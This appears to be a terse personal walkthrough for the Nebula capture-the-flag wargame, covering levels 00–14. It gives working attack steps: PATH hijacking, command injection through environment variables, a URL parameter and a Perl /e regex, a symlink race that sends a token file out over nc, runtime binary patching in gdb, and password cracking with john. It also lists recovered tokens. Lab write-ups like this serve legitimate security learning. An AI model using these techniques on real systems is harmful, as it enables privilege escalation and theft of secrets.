

level00:
	just use find

level01:
	create the script "#!/bin/bash; getflag;" in tmp, name it "echo" and add it to the PATH

level02:
	using the same file from level02, set USER to "; /tmp/<my_file>"

level03:
	make a script which will run shell in the writable.d dir

level04:
	create a symbolic link. the token is the password of flag04

level05:
	copy the file and extract it.
	
level06:
	use john on flag06 pass in /etc/passwd

level07:
	make the machine bridged, and surf to http://<machine_ip>:7007/index.cgi
	pass the variable Host by adding it to the url like this: http://<machine_ip>:7007/index.cgi?Host=8.8.8.8
	inject a command using a ; (encoded to %3B) http://<machine_ip>:7007/index.cgi?Host=8.8.8.8%3Bgetflag
	
level08:
	copy the pcap file to the host using "nc", and then open with wireshark and get "flag08" passowrd.
	
level09:
	The script takes 2 arguments - a file and a dummy - and runs regex replaces on the content of the file.
	It runs the "spam" function with the /e modifier IF the strings is like [email (.*)].
	steps:
		* create a file which contains the line [email {${system(sh)}}]
		* run ./flag09 <my_file> bla

level10:
	concept - give the program a dummy file, and make it a sym-link to "token" while it tries to connect to host.
	
	The program asks for a file host, checks if we are allowed to access the file, then creates a connection 
	to the host and sends it the contents of the file in port 18211.
	
	steps:
		1. create a file named bla in /home/level10 - "echo blaaaaa > bla"
		2. execute the script IN THE BACKGROUND with bla as file and the host machine's ip as 
		   host - "/home/flag10/flag10 /home/level10/bla 192.168.56.1 &"
		   it is important to run it with & so when it tries to connect to host we will change the "bla" file.
		3. we have passed the "access" check and we are waiting for connection to "host".
		   replace the regular "bla" file with a symbolic link to "token"
		   * rm bla
		   * ln -s /home/flag10/token /home/level10/bla
		4. ON THE HOST MACHINE, with nc, open the connection with the guest machine
		   "nc -l -p18211"
		5. move the job to the fg using: "fg +"
		6. voah-lah! you got yourself the token to flag10!
		   "615a2ce1-b2b5-4c76-8eed-8aa5c4015c27"
		   
		   
level13:
	concept - edit the je command to jne at runtime
	
	steps:
		1. gdb flag13
		2. break main (set a breakpoint at main)
		3. run
		4. disassemble (displays the assembly code. the interesting line is at [main+53]0x080484f9)
		5. x/4x 0x080484f9:
			a. x command shows the instruction in a line
			b. 4 - display 4 chunks of data
			c. x - display in hex. can use i for instruction, d for decimal, etc..
		  the je instruction is 74 (the full LITTLE ENDIAN chunk is 0xc0e83674
		6. set *(char*)0x080484f9=0x75 (change the instruction to jne)
		7. continute - the token is b705702b-76a8-42b0-8844-3adabbe5ac58
		8. su flag13 (password: b705702b-76a8-42b0-8844-3adabbe5ac58)
		
level14:
	use the nebula14_decryptor to find the password
	password - 8457c118-887c-4e40-a5a6-33a25353165